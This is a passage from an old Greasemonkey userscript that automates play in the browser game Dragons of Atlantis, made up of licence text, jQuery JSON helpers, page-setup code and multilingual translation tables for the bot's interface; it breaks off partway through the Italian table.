// ==UserScript==
// @name          DoA updated 2012 and total functionally
// @namespace     http://www.mmogwiki.com/scripts/dragonsofatlantis
// @description   Power Tools for Dragons of Atlantis
// @include       *://apps.facebook.com/dragonsofatlantis/*
// @include       *://*.castle.wonderhill.com/platforms/facebook/game
// @exclude       *://apps.facebook.com/dragonsofatlantis/rubies
// @match         *://apps.facebook.com/dragonsofatlantis/*
// @match         *://*.castle.wonderhill.com/platforms/facebook/game
// @include       *://plus.google.com/games/659749063556*
// @include       *://plus.google.com/*/games/659749063556*
// @include       *://*.googleusercontent.com/gadgets/ifr?url=app://659749063556*
// @match         *://plus.google.com/games/659749063556*
// @match         *://*.googleusercontent.com/gadgets/ifr?url=app://659749063556*
// @version       20111111a
// @icon          http://www.mmogwiki.com/scripts/dragonsofatlantis/powertools/logo.png
// ==/UserScript==

/********************************************************************************
 * INFORMATION                                                                  *
 *                                                                              *
 * Name: DoA Power Tools updated                                              *
 * Version: 20120104a                                                           *
 * Last Modified: 11 November 2011 23:59  GMT+3                                 *
 * Original Authors: G.Jetson, Runey & Wham                                     *
 * Current  Authors: La Larva, Runey, Lord Mimir, Wham & Didi                   *
 * Collaborators:                                                               *
 *               AqUaRiUs KaMuS (Site in Spanish)                               *
 *               Tweakit    (Dutch   translator)                                *
 *               Randalph   (French  translator)                                *
 *               Native     (German  translator)                                *
 *               Boaro      (Italian translator)                                *
  *                                                                             *
 * ACKNOWLEDGEMENTS                                                             *
 *                                                                              *
 * DoA Power Tools Teamwork has been written from the ground up and is not      *
 * considered a fork of any other project. However it could never of happened   *
 * without the work done by many scriptwriters on the original DoA Power Tools  *
 * and its many mods.                                                           *
 *                                                                              *
 * DoA Power Tools by George Jetson                                             *
 *  - <http://userscripts.org/scripts/show/102481>                              *
 * DoA Power Tools Plus by Runey                                                *
 *  - <http://userscripts.org/scripts/show/104301>                              *
 * DoA Power Tools Mod by Wham                                                  *
 *  - <http://userscripts.org/scripts/show/103833>                              *
 * DoA Power Tools Teamwork by Runey, Wham, La Larva & Lord Mimir               *
 *  - <http://userscripts.org/scripts/show/114012>                              *
 *                                                                              *
 * DEVELOPMENT                                                                  *
 *                                                                              *
 * If you wish to contribute to the development of DoA Power Tools Teamwork you *
 * can do so at <INSERT WIKI ADDRESS HERE WHEN DONE>.                           *
 *                                                                              *
 * If you wish to contribute to the development of DoA Power Tools Teamwork you *
 * can do so at <INSERT WIKI ADDRESS HERE WHEN DONE>.                           *
 *                                                                              *
 * If you wish to fork this project then you may do so as long as the following *
 * conditions are met.                                                          *
 *  - The GNU General Public License version 3 or later is used                 *
 *  - All acknowledgements MUST be included in the source code                  *
 *  - A link to the API at MMOG Wiki MUST be included in the source code        *
 *  - It MUST be free (though as per the GNU Public License a small fee for     *
 *    distribution and/or support may be charged)                               *
 *                                                                              *
 * LICENSE                                                                      *
 *                                                                              *
 * Released under the GPL license                                               *
 * http://www.gnu.org/copyleft/gpl.html                                         *
 *                                                                              *
 * This program is free software: you can redistribute it and/or modify it      *
 * under the terms of the GNU General Public License as published by the        *
 * Free Software Foundation, either version 3 of the License, or                *
 * (at your option) any later version.                                          *
 *                                                                              *
 * This program is distributed in the hope that it will be useful, but          *
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY   *
 * or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License     *
 * for more details.                                                            *
 *                                                                              *
 * You should have received a copy of the GNU General Public License along with *
 * this program.  If not, see <http://www.gnu.org/licenses/>.                   *
 ********************************************************************************/
 
 
 
 /*
 
 WE ARE VERY SORRY FOR HAVING TO TAKE THIS DECISION, 
 
 BUT WE HAD TO OBFUSCATE THE CODE BECAUSE SOME PEOPLE 
 
 ARE MAKING CHANGES ABUSES THAT WILL END UP HURTING EVERYONE.
 
 WE NEVER WANTED THAT TO HAPPEN EITHER AND WE ARE SORRY THAT IT'S NECESSARY
 
 */
  
(function() {

var escapeable = /["\\\x00-\x1f\x7f-\x9f]/g,
    meta = {
        '\b': '\\b',
        '\t': '\\t',
        '\n': '\\n',
        '\f': '\\f',
        '\r': '\\r',
        '"' : '\\"',
        '\\': '\\\\'
    };

/**
 * jQuery.toJSON
 * Converts the given argument into a JSON respresentation.
 *
 * @param o {Mixed} The json-serializble *thing* to be converted
 *
 * If an object has a toJSON prototype, that will be used to get the representation.
 * Non-integer/string keys are skipped in the object, as are keys that point to a
 * function.
 *
 */
toJSON = typeof JSON === 'object' && JSON.stringify
    ? JSON.stringify
    : function( o ) {

    if ( o === null ) {
        return 'null';
    }

    var type = typeof o;

    if ( type === 'undefined' ) {
        return undefined;
    }
    if ( type === 'number' || type === 'boolean' ) {
        return '' + o;
    }
    if ( type === 'string') {
        return $.quoteString( o );
    }
    if ( type === 'object' ) {
        if ( typeof o.toJSON === 'function' ) {
            return $.toJSON( o.toJSON() );
        }
        if ( o.constructor === Date ) {
            var month = o.getUTCMonth() + 1,
                day = o.getUTCDate(),
                year = o.getUTCFullYear(),
                hours = o.getUTCHours(),
                minutes = o.getUTCMinutes(),
                seconds = o.getUTCSeconds(),
                milli = o.getUTCMilliseconds();

            if ( month < 10 ) {
                month = '0' + month;
            }
            if ( day < 10 ) {
                day = '0' + day;
            }
            if ( hours < 10 ) {
                hours = '0' + hours;
            }
            if ( minutes < 10 ) {
                minutes = '0' + minutes;
            }
            if ( seconds < 10 ) {
                seconds = '0' + seconds;
            }
            if ( milli < 100 ) {
                milli = '0' + milli;
            }
            if ( milli < 10 ) {
                milli = '0' + milli;
            }
            return '"' + year + '-' + month + '-' + day + 'T' +
                hours + ':' + minutes + ':' + seconds +
                '.' + milli + 'Z"';
        }
        if ( o.constructor === Array ) {
            var ret = [];
            for ( var i = 0; i < o.length; i++ ) {
                ret.push( $.toJSON( o[i] ) || 'null' );
            }
            return '[' + ret.join(',') + ']';
        }
        var name,
            val,
            pairs = [];
        for ( var k in o ) {
            type = typeof k;
            if ( type === 'number' ) {
                name = '"' + k + '"';
            } else if (type === 'string') {
                name = $.quoteString(k);
            } else {
                // Keys must be numerical or string. Skip others
                continue;
            }
            type = typeof o[k];

            if ( type === 'function' || type === 'undefined' ) {
                // Invalid values like these return undefined
                // from toJSON, however those object members
                // shouldn't be included in the JSON string at all.
                continue;
            }
            val = $.toJSON( o[k] );
            pairs.push( name + ':' + val );
        }
        return '{' + pairs.join( ',' ) + '}';
    }
};

/**
 * jQuery.evalJSON
 * Evaluates a given piece of json source.
 *
 * @param src {String}
 */
evalJSON = typeof JSON === 'object' && JSON.parse
    ? JSON.parse
    : function( src ) {
    return eval('(' + src + ')');
};

/**
 * jQuery.secureEvalJSON
 * Evals JSON in a way that is *more* secure.
 *
 * @param src {String}
 */
secureEvalJSON = typeof JSON === 'object' && JSON.parse
    ? JSON.parse
    : function( src ) {

    var filtered = 
        src
        .replace( /\\["\\\/bfnrtu]/g, '@' )
        .replace( /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
        .replace( /(?:^|:|,)(?:\s*\[)+/g, '');

    if ( /^[\],:{}\s]*$/.test( filtered ) ) {
        return eval( '(' + src + ')' );
    } else {
        throw new SyntaxError( 'Error parsing JSON, source is not valid.' );
    }
};

/**
 * jQuery.quoteString
 * Returns a string-repr of a string, escaping quotes intelligently.
 * Mostly a support function for toJSON.
 * Examples:
 * >>> jQuery.quoteString('apple')
 * "apple"
 *
 * >>> jQuery.quoteString('"Where are we going?", she asked.')
 * "\"Where are we going?\", she asked."
 */
quoteString = function( string ) {
    if ( string.match( escapeable ) ) {
        return '"' + string.replace( escapeable, function( a ) {
            var c = meta[a];
            if ( typeof c === 'string' ) {
                return c;
            }
            c = a.charCodeAt();
            return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
        }) + '"';
    }
    return '"' + string + '"';
};

var $J;
var SCRIPT_VERSION = "20111111a";
var SCRIPT_MOD_BY  = "Melkor";
var API_VERSION    = "deadbeef";
var DATA_VERSION   = "20111111a";
var update_ok = false;
"use strict";


function preparePage() {
    $J = jQuery.noConflict();
    var d, c = "#castlemania_swf",
        a;
    if (window.location.href.indexOf("facebook") !== -1) {
        d = "#iframe_canvas";
        a = "facebook"
    } else {
        if (window.location.href.indexOf("google") !== -1) {
            d = "#oz-gadgets-canvas-iframe-659749063556";
            a = "google"
        }
    }
    if (window.top === window.self) {
        function e() {
            clearTimeout;
            if ($J(d).length < 1) {
                setTimeout(e, 100);
                return
            }
            switch (a) {
            case "facebook":
                $J("#rightCol").css("display", "none");
                $J("#blueBar").css("position", "relative");
                break;
            case "google":
                $J(".Pca").css("display", "none");
                break
            }
            $J(d).parents().css({
                width: "100%",
                margin: "0"
            })
        }
        e()
    } else {
        function b() {
            clearTimeout;
            if ($J(c).length < 1) {
                setTimeout(b, 100);
                return
            }
            switch (a) {
            case "facebook":
                $J("#hd > div").css("display", "none");
                $J("#ft").css("display", "none");
                $J("#cn").parent().append($J("#hd"));
                break;
            case "google":
                $J("#pane_hd").css("display", "none");
                break
            }
            $J("#container").width("760px");
            initScript(c)
        }
        b()
    }
}
var AutoCollect, Buildings, Data, DefaultDataOptions, $main_box, Manifest, Map, Marches, Messages, MyAjax, RequestQueue, ScriptStyles, Seed, $startUpBox, Tabs = {},
    ToTranslate = {},
    Translation, UID = {},
    UIDN = {},
    VerboseLog;
var translate = actionLog = debugLog = verboseLog = function () {};
var LANG_OBJECT;
UID = {};
UIDN = {};

function makeUID(a) {
    var a = (a !== undefined ? a : 20);
    var d = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "u", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "U", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "_"];
    var c = d[Math.floor(Math.random() * 54)];
    for (var b = 0; b < a; b++) {
        c += d[Math.floor(Math.random() * 64)]
    }
    return c
}
function getUID(a) {
    return UID[a] !== undefined ? UID[a] : a
}
function setUID(a) {
    var b = makeUID();
    while (UIDN[b] !== undefined) {
        b = makeUID()
    }
    UIDN[b] = 1;
    UID[a] = b;
    return b
}
if (SCRIPT_MOD_BY.length) {
    String.scriptModBy = SCRIPT_MOD_BY
}
function initScript(C) {
    var D = "DoA Power Tools Teamwork";
    var E = "http://www.mmogwiki.com/forum/index.php?f=5&t=409&rb_v=viewtopic";
    var F = "";
    var G = 1;
    var H = 2;
    var I = 3;
    var J = 4;
    var K = 5;
    var L = 6;
    var M = 99;
    var N = true;
    var O = true;
    var P = true;
    var Q = true;
    var R = true;
    var S = true;
    var T = false;
    var U = false;
    var V = false;
    var W = Math.randRange(5000, 10000);
    var X = 30;
    var Y = navigator.language.substring(0, 2).toLowerCase();
    var Z = (Y !== "en");
    var ba = navigator.userAgent.toLowerCase().indexOf("chrome") > -1;
    var bb = "ERROR WHILST FETCHING DATA FROM SERVER";
    var bc = "Please disable the script and see if you are able to play the game manually. If normal play is possible then enable the script and try again. If the error persists please read the following post before submitting a report. If normal play is not possible then wait until it is and try again.";
    var bd = "<B>Error initializing:</b><BR><BR>Unable to find SWF element";
    var be = "Unable to start $SCRIPT_NAME$ <BR>";
    var bf = "<B>Error initializing:</b><BR><BR>";
    var bg = "#2B4988";
    switch (Y) {
    case "de":
        LANG_OBJECT = {
            "above the first value": "über dem ersten Wert",
            "Action Logs": "Aktion Logs",
            Actions: "Aktionen",
            and: "und",
            "Are you sure you want to": "Sind Sie sicher, dass Sie",
            at: "bei",
            "Attack One Target in Waves": "Wellenangriff auf ein Ziel",
            "Attack sent to": "Angriffe an",
            Attacking: "Angriff",
            "Attacks Configuration": "Angriff Konfiguration",
            "Attacks Logs": "Angriffs-Logbücher",
            "Attacks stopped momentarily to prevent server blocking": "Angriffe gestoppt momentan auf Server blockiert verhindern",
            Attacks: "Attacken",
            "Auto Refresh every": "Auto Auffrischen jeder",
            Automatically: "Automatisch",
            "Awaiting task completion notification": "Erwarte Abschlussbenachrichtingung der Aufgabe",
            Building: "Gebäude",
            Busy: "Beschäftigt",
            by: "durch",
            "Clear last attack on all maps": "Lösche letzten Angriff auf alle Karten",
            "Clear last attack on current map": "Lösche letzten Angriff auf aktueller Karte",
            Config: "Konfiguration",
            "Console Logs": "Konsolen Logbücher",
            Console: "Konsole",
            Coordinates: "Koordinaten",
            Days: "Tage",
            "Delay Between Attacks": "Verzögerung zwischen Angriffen",
            Disabled: "Deaktiviert",
            "Distance must be between": "Entfernung muss zwischen",
            Distance: "Entfernung",
            "Dont make Wildernesses of the terrains attacked": "Machen Sie keine Wildnis des Terrains angegriffen",
            Enable: "Aktivieren",
            Enabled: "Aktiviert",
            Error: "Fehler",
            "First value must be between": "Erster Wert muss zwischen",
            Full: "ausgelastet",
            "Game Options": "Spiel Optionen",
            "Going to the coords": "Gehen um die Koordinaten",
            Hiding: "Verstecken",
            Hour: "Stunde",
            Hours: "Stunden",
            Info: "Info",
            "Invalid Date From": "Ungültiges Datum aus",
            "Invalid Date To": "Ungültiges Datum zu",
            "Invalid delays": "Ungültige Verzögerungen",
            "Invalid number of troops": "Ungültige Anzahl von Truppen",
            "Invalid Range Date": "Ungültiger Bereichs Datum",
            "Last Attack": "Letzter Angriff",
            Loaded: "Geladen",
            Logs: "Logbücher",
            "Manual attack sent to": "Manueller Angriff gesendet an",
            "Maximum simultaneous marches": "Maximale gleichzeitige Märsche",
            miles: "Meilen",
            "Minimum Housing": "Minimale Bürger",
            "Minimum Resource Levels": "Minimale Ressourcen",
            Minutes: "Minuten",
            "No Generals Available": "Keine Generäle verfügbar",
            "No targets or troops available": "Keine Ziele oder Truppen verfügbar",
            "No troops available": "Keine Truppen verfügbar",
            "No Troops Defined": "Keine Truppen ausgewählt",
            "Not enough": "Nicht genügend",
            Not: "Nicht",
            "of inactivity": "der Inaktivität",
            of: "der",
            "Opening the map on the last position": "Das Öffnen der Karte auf der letzten position",
            Options: "Optionen",
            "Outpost 1": "Wasser-Außenposten",
            "Outpost 2": "Stein-Außenposten",
            "Outpost 3": "Feuer-Außenposten",
            "Outpost 4": "Wind-Außenposten",
            "Permanent Data": "Dauerhaft Daten",
            "Preparing Attack": "Vorbereitung Angriff",
            Refresh: "Aktualisieren",
            Researching: "Forschen",
            "Retry in": "Wiederholen in",
            "Run Time": "Laufzeit",
            "Safe Mode": "Sicherer Modus",
            "Scanning Map": "Scanne Karte innerhalb von $NUM$ Meilen <BR> Ungefähre restliche Wartezeit",
            "Script Options": "Skript-Optionen",
            "Search Radius": "Suchradius",
            "Second value must be at least": "Zweiter Wert muss mindestens",
            Seconds: "Sekunden",
            "Send Dragon every certain number of waves": "Send Drachen jeder bestimmte Anzahl von Wellen",
            "Start Date": "Startdatum",
            "Stop if any troops lost": "Stopp bei Truppenverlust",
            Successfully: "Erfolgreich",
            Summary: "Übersicht",
            Targets: "Ziele",
            "Task Completed": "Erledigt",
            Tasks: "Aufgaben",
            "Too many errors,  disabling auto train": "Zu viele Fehler, deaktivere automatische Ausbildung",
            "Too many troops for muster point level": "Maximale Truppenanzahl laut Truppensammelplatz-Level überschritten",
            "Training Configuration": "Ausbildungs Konfiguration",
            "Training queue": "Trainings-Warteschlange",
            "Troops for Wave Attack": "Truppen für Wellenangriff",
            "Troops lost": "Truppen verloren",
            "Troops Not Defined": "Truppen nicht definiert",
            "Use the Levels Tab to select attack areas": "Benutze die Level-Tabelle um Angriffsbereiche auszuwählen",
            "Userset maximum marches reached": "Eingestellte maximale Märsche erreicht",
            "Verbose logging": "Ausführlichen Logbücher",
            waiting: "warten",
            Warnings: "Warnung",
            "Wave attack to": "Wellenangriff zu",
            Wave: "Welle",
            "Window drag": "Fensterverschiebung",
            "Withdraw troops if they are encamped": "Ziehen Truppen wenn sie lagerten sich",
            "~ArmoredTransport": "Luftis",
            "~BattleDragon": "KampfDr",
            "~Conscript": "Rekrut",
            "~FireDragon": "FeuerDra",
            "~FireMirror": "Feuersp",
            "~FireTroop": "Pyros",
            "~Giant": "Riesen",
            "~GreatDragon": "GrossDr",
            "~Halberdsman": "Hellebar",
            "~Longbowman": "Bogi",
            "~Minotaur": "Mino",
            "~PackDragon": "PckDrg",
            "~Porter": "Träger",
            "~Spy": "Spion",
            "~StoneDragon": "SteinDr",
            "~StoneTroop": "Oger",
            "~SwiftStrikeDragon": "kFD",
            "~WaterDragon": "WasserDr",
            "~WindDragon": "WindDr",
            "~WindTroop": "Banshee",
            "~Zzz": "Zzz"
        };
        break;
    case "es":
        LANG_OBJECT = {
            "above the first value": "por encima del primer valor",
            "Action Log": "Reporte de Acciones",
            Actions: "Acciones",
            and: "y",
            "Are you sure you want to": "Esta seguro que desea",
            at: "en",
            "Attack One Target in Waves": "Ataques en Oleadas a Objetivos",
            "Attack sent to": "Ataque enviado a",
            Attacking: "Atacando",
            "Attacks Configuration": "Configuración de Ataques",
            "Attacks Logs": "Registro de Ataques",
            "Attacks stopped momentarily to prevent server blocking": "Los ataques se detuvieron momentáneamente para evitar el bloqueo del servidor",
            Attacks: "Ataques",
            "Auto Refresh every": "Auto Recargar la página cada",
            Automatically: "Automáticamente",
            "Awaiting task completion notification": "En espera de la notificación de finalización de la tarea",
            Building: "Edificando",
            Busy: "Ocupado",
            by: "por",
            "Clear last attack on all maps": "Borrar todos los registros de últimos ataques",
            "Clear last attack on current map": "Borrar registro de últimos ataques actuales",
            Config: "Configuración",
            "Console Log": "Registros de Consola",
            Console: "Consola",
            Coordinates: "Coordenadas",
            d: "d",
            Days: "Día(s)",
            "Delay Between Attacks": "Tiempo de retraso entre ataques",
            Disabled: "Desactivado",
            "Distance must be between": "La distancia debe estar entre",
            Distance: "Distancia",
            "Dont make Wildernesses of the terrains attacked": "No hacer Desiertos de los terrenos atacados",
            Enable: "Activar",
            Enabled: "Activado",
            Error: "Error",
            "First value must be between": "El primer valor debe ser de",
            Full: "Lleno",
            "Game Options": "Opciones del Juego",
            "Going to the coords": "Llendo a las Coordenadas",
            h: "h",
            Hiding: "Esconder Tropas",
            Hour: "Hora",
            Hours: "Hora(s)",
            Info: "Info",
            "Invalid Date From": "Formato de Fecha de Inicio Invalido",
            "Invalid Date To": "Formato de Fecha de Finalizacion Invalido",
            "Invalid delays": "Intervalo de Retraso Invalido",
            "Invalid number of troops": "Numero invalido de tropas",
            "Invalid Range Date": "Rango de Fecha Invalido",
            "Last Attack": "Último Ataque",
            Loaded: "Cargado",
            Logs: "Registros",
            m: "m",
            "Manual attack sent to": "Ataque Manual enviado a",
            "Maximum simultaneous marches": "Máximo de Marchas Simultáneas",
            miles: "millas",
            "Minimum Housing": "por Mínimo de Casas",
            "Minimum Resource Levels": "por Mínimo de Niveles de Recursos",
            Minutes: "Minuto(s)",
            "No Generals Available": "No hay generales disponibles",
            "No targets or troops available": "Sin objetivos o tropas disponibles",
            "No troops available": "No hay suficientes tropas",
            "No Troops Defined": "No Hay Tropas Definidas",
            "Not enough": "No hay suficiente",
            Not: "No",
            "of inactivity": "de inactividad",
            of: "de",
            "Opening the map on the last position": "Abriendo el mapa en la última posición",
            Options: "Opciones",
            "Outpost 1": "Ciudad del Agua",
            "Outpost 2": "Ciudad de la Piedra",
            "Outpost 3": "Ciudad del Fuego",
            "Outpost 4": "Ciudad del Viento",
            "Permanent Data": "Datos Permanentes",
            "Preparing Attack": "Preparando el Ataque",
            Refresh: "Actualizar",
            Researching: "Investigando",
            "Retry in": "Reintentando en",
            "Run Time": "Tiempo de Ejecucción",
            s: "s",
            "Safe Mode": "Modo Seguro",
            "Scanning Map": "Buscando datos en $NUM$ millas a la redonda<BR>Este proceso puede demorar un tiempo",
            "Script Options": "Opciones del Script",
            "Search Radius": "Radio de Busqueda",
            "Second value must be at least": "El segundo valor debe ser por lo menos de",
            Seconds: "Segundo(s)",
            "Send Dragon every certain number of waves": "Enviar Dragón cada cierto número de oleadas",
            "Start Date": "Fecha de Inicio",
            "Stop if any troops lost": "Detener ataques si se pierden tropas",
            Successfully: "Exitosamente",
            Summary: "Detalles",
            Targets: "Objetivos",
            "Task Completed": "Tarea Finalizada",
            Tasks: "Tareas",
            "Too many errors, disabling auto training": "Demasiados errores, Desactivado Adiestramientos",
            "Too many troops for muster point level": "Demasiadas tropas para el Nivel actual del Punto de Encuentro",
            "Training Configuration": "Configuración de Adiestramientos",
            "Training queue": "Encolando Adistramientos",
            "Troops for Wave Attack": "Tropas para Ataques Masivos",
            "Troops lost": "¡Se han perdido tropas",
            "Troops Not Defined": "No Hay Tropas Definidas",
            "Use the Levels Tab to select attack areas": "Usar la solapa de Niveles para seleccionar el rango de ataque",
            "Userset maximum marches reached": "Llegaste al limite defindo por ti de marchas",
            "Verbose logging": "Registro detallado",
            waiting: "esperando",
            Warnings: "Advertencias",
            "Wave attack to": "Ataque en Oleada a",
            Wave: "Oleadas",
            "Window drag": "Arrastrar la ventana",
            "Withdraw troops if they are encamped": "Retirar tropas de terrenos conquistados",
            "~AquaTroop": "Tritón",
            "~ArmoredTransport": "TransB",
            "~BattleDragon": "DrgComb",
            "~Conscript": "Reclu",
            "~FireDragon": "Drg Fueg",
            "~FireMirror": "Espejo",
            "~FireTroop": "Magma",
            "~Giant": "Gigante",
            "~GreatDragon": "Gran Drg",
            "~Halberdsman": "Alabar",
            "~Longbowman": "Arq",
            "~Minotaur": "Mino",
            "~PackDragon": "Drg Carg",
            "~Porter": "Porteador",
            "~Spy": "Espía",
            "~StoneDragon": "Drg Pét",
            "~StoneTroop": "Ogro",
            "~SwiftStrikeDragon": "DrgARap",
            "~WaterDragon": "Drg Agua",
            "~WindDragon": "Drg Viet",
            "~WindTroop": "Bansh",
            "~Zzz": "Zzz"
        };
        break;
    case "fr":
        LANG_OBJECT = {
            "above the first value": "supérieure à la premiere",
            "Action Logs": "Console",
            Actions: "Actions",
            and: "et",
            at: "à",
            "Attack One Target in Waves": "Attaquer une cible par vagues",
            "Attack sent to": "Attaque envoyée vers",
            Attacking: "Attaquer",
            Attacks: "Attaques",
            "Attacks Configuration": "Configuration",
            "Attacks Stats": "Stats",
            "Attacks stopped momentarily to prevent server blocking": "Attaques arrêtées momentanément pour éviter le blocage du serveur",
            Attacks: "Attaques",
            "Auto Refresh every": "Rafraichir toutes les",
            Automatically: "Automatique",
            "Awaiting task completion notification": "En attente de la notification de fin des tâches",
            Building: "Bâtiment",
            Busy: "Occupé",
            by: "par",
            "Clear last attack on all maps": "Réinitialiser toutes les cartes",
            "Clear last attack on current map": "Réinitialiser les attaques sur la carte",
            Config: "Config",
            "Console Logs": "Console Logs",
            Console: "Console",
            Coordinates: "Coordonnées",
            d: "j",
            Days: "Jours",
            "Delay Between Attacks": "Délai entre les attaques",
            Disabled: "Désactiver",
            "Distance must be between": "La distance doit être comprise entre",
            Distance: "Distance",
            "Dont make Wildernesses of the terrains attacked": "Ne pas occuper les étendues sauvages",
            Enable: "Activer",
            Enabled: "Activé",
            Error: "Erreur",
            "First value must be between": "La valeur du délai doit être comprise entre",
            Full: "Complet",
            "Game Options": "Options de jeu",
            "Going to the coords": "Aller aux coordonnées",
            h: "h",
            Hiding: "Cacher",
            Hour: "Heure",
            Hours: "Heures",
            Info: "Infos",
            "Invalid Date From": "Date non valide de",
            "Invalid Date To": "Date non valide pour",
            "Invalid delays": "Délai invalide",
            "Invalid number of troops": "Nombre d'unités invalide",
            "Invalid Range Date": "Format de la date incorrect",
            "Last Attack": "Dernière attaque",
            Loaded: "Script chargé",
            Logs: "Journal",
            m: "m",
            "Manual attack sent to": "Attaque manuelle vers",
            "Maximum simultaneous marches": "Maximum de marches simultanées",
            miles: "miles",
            "Minimum Housing": " Population Minimum",
            "Minimum Resource Levels": " Niveaux de Ressources Minimum",
            Minutes: "Minutes",
            "No Generals Available": "Pas de généraux disponible",
            "No targets or troops available": "Aucune cibles ou troupes disponibles",
            "No troops available": "Pas de troupes disponibles",
            "No Troops Defined": "Pas de troupes définies",
            "Not enough": "Pas assez",
            Not: "Non",
            "of inactivity": "d'inactivitées",
            of: "des",
            "Opening the map on the last position": "Ouvre la carte aux dernières coordonnées",
            Options: "Options",
            "Outpost 1": "Poste extérieur #1",
            "Outpost 2": "Poste extérieur #2",
            "Outpost 3": "Poste extérieur #3",
            "Outpost 4": "Poste extérieur #4",
            "Permanent Data": "Données en cache",
            "Preparing Attack": "Préparation d'attaque",
            Refresh: "Actualiser",
            Researching: "Recherche en cours",
            "Retry in": "nouvel essai dans",
            "Run Time": "Temps d'exécution",
            s: "s",
            "Safe Mode": "Mode Sans échec",
            "Scanning Map": "Balayage de la carte sur $NUM$ miles.<BR>Attendez la fin du scan, ne quittez pas la page",
            "Script Options": "Options de script",
            "Search Radius": "Rayon de balayage",
            "Second value must be at least": "La deuxième valeur doit être au moins",
            Seconds: "Secondes",
            "Send Dragon every certain number of waves": "Choisir l'ordre de marche des grands dragons",
            "Start Date": "Date de début",
            "Stop if any troops lost": "Désactiver en cas de pertes",
            Successfully: "Réussi",
            Summary: "Général",
            Targets: "Cibles",
            "Task Completed": "Tache terminée",
            Tasks: "Taches",
            "Too many errors,  disabling auto train": "Trop d'erreurs, entrainement automatique désactivé",
            "Too many troops for muster point level": "Déploiement maximal atteint",
            "Training Configuration": "Configuration",
            "Training queue": "File de formation en attente",
            "Troops for Wave Attack": "Sélectionnez vos troupes",
            "Troops lost": "Troupes perdues",
            "Troops Not Defined": "Aucunes troupes définies",
            "Use the Levels Tab to select attack areas": 'Utilisez l\'onglet "Niveaux" et sélectionnez la cible',
            "Userset maximum marches reached": "Maximum de marches simultanés atteinte",
            "Verbose logging": "Journal d'évenements",
            waiting: "en attente",
            Warnings: "Avertissements",
            "Wave attack to": "Attaque en vagues vers",
            Wave: "Vagues",
            "Window drag": "Glisser/déposer",
            "Withdraw troops if they are encamped": "Retirer les troupes en campement",
            "~AquaTroop": "Sol Aqua",
            "~ArmoredTransport": "Ballons",
            "~BattleDragon": "Drg Gr",
            "~Conscript": "Conscrit",
            "~FireDragon": "Drg Feu",
            "~FireMirror": "Miroir",
            "~FireTroop": "Magma",
            "~Giant": "Géant",
            "~GreatDragon": "Grd Drg",
            "~Halberdsman": "Halbrd",
            "~Longbowman": "Archer",
            "~Minotaur": "Mino",
            "~PackDragon": "Drg Trsp",
            "~Porter": "Porteur",
            "~Spy": "Espion",
            "~StoneDragon": "DrgPierre",
            "~StoneTroop": "Ogre",
            "~SwiftStrikeDragon": "Rap Drg",
            "~WaterDragon": "Drg Aqua",
            "~WindDragon": "Drg Vent",
            "~WindTroop": "Banshee",
            "~Zzz": "Zzz"
        };
        break;
    case "it":
        LANG_OBJECT = {
            "above the first value": "in più del valore minimo",
            "Action Logs": "Registro Azioni",
            Actions: "Azioni",
            and: "e",
            "Are you sure you want to": "Sei sicuro di voler",
            at: "a",
            "Attack One Target in Waves": "Attacco un obiettivo con Ondate",
            "Attack sent to": "Attacco inviato a",
            Attacking: "Attacco in corso",
            "Attacks Configuration": "Configurazione degli attacchi",
            "Attacks Logs": "Registro attacchi",
            "Attacks stopped momentarily to prevent server blocking": "Attacchi temporaneamente fermati per prevenire il blocco da parte del server",
            Attacks: "Attacchi",
            "Auto Refresh every": "Aggiorna automaticamente ogni",
            Automatically: "Automaticamente",
            "Awaiting task completion notification": "In attesa della di notifica completamento delle attività",
            Building: "Costruendo",
            Busy: "Occupato",
            by: "da",
            "Clear last attack on all maps": "Cancella l'ultimo attacco eseguito su tutte le mappe",
            "Clear last attack on current map": "Cancella l'ultimo attacco eseguito su questa mappa",
            Config: "Configurazione",
            "Console Logs": "Registro console",
            Console: "Console",
            Coordinates: "Coordinate",
            Days: "Giorni",
            "Delay Between Attacks": "Ritardo tra gli attacchi",
            Disabled: "Disabilita",
            "Distance must be between": "La distanza deve essere tra",
            Distance: "Distanza",
            "Dont make Wildernesses of the terrains attacked": "Non conquistare i terreni attaccati",
            Enable: "Abilita",
            Enabled: "Abilitato",
            Error: "Errore",
            "First value must be between": "Il valore minimo deve essere compreso tra",
            Full: "Completo",
            "Game Options": "Opzioni di gioco",
            "Going to the coords": "Stanno andando verso le coordinate designate",
            Hiding: "Truppe NASCOSTE",
            Hour: "Ora",
            Hours: "Ore",
            Info: "Informazioni",
            "Invalid Date From": "Data Invalida Da",
            "Invalid Date To": "Data Invalida A",
            "Invalid delays": "Ritardo non valido",
            "Invalid number of troops": "Numero di truppe non Valido",
            "Invalid Range Date": "Periodo di tempo non valido",
            "Last Attack": "Ultimo attacco",
            Loaded: "Caricato",
            Logs: "Registri",
            "Manual attack sent to": "Inviato attacco manuale a ",
            "Maximum simultaneous marches": "Massime Marce simultanee",
            miles: "chilometri",
            "Minimum Housing": "Una truppa per città alla volta",
            "Minimum Resource Levels": "Fino ad esaurimento risorse",
            Minutes: "Minuti",
            "No Generals Available": "Nessun generale disponibile",
            "No targets or troops available": "Nessun obiettivo o truppa disponibile",
            "No troops available": "Nessuna truppa disponibile",
            "No Troops Defined": "Nessuna truppa definita",
            "Not enough": "Non hai abbastanza",
            Not: "Non",
            "of inactivity": "di inattività",
            of: "di",
            "Opening the map on the last position": "Sto aprendo la mappa all'ultima posizione",
            Options: "Opzioni",
            "Outpost 1": "Avamposto d'Acqua",
            "Outpost 2": "Avamposto di Pietra",
            "Outpost 3": "Avamposto di Fuoco",
            "Outpost 4": "Avamposto di Vento",
            "Permanent Data": "Dati Permanenti",
            "Preparing Attack": "Preparazione attacco",
            Refresh: "Aggiorna",
            Researching: "Sto ricercando",
            "Retry in": "Riprova in",
            "Run Time": "Esecuzione",
            "Safe Mode": "Modalità provvisoria",
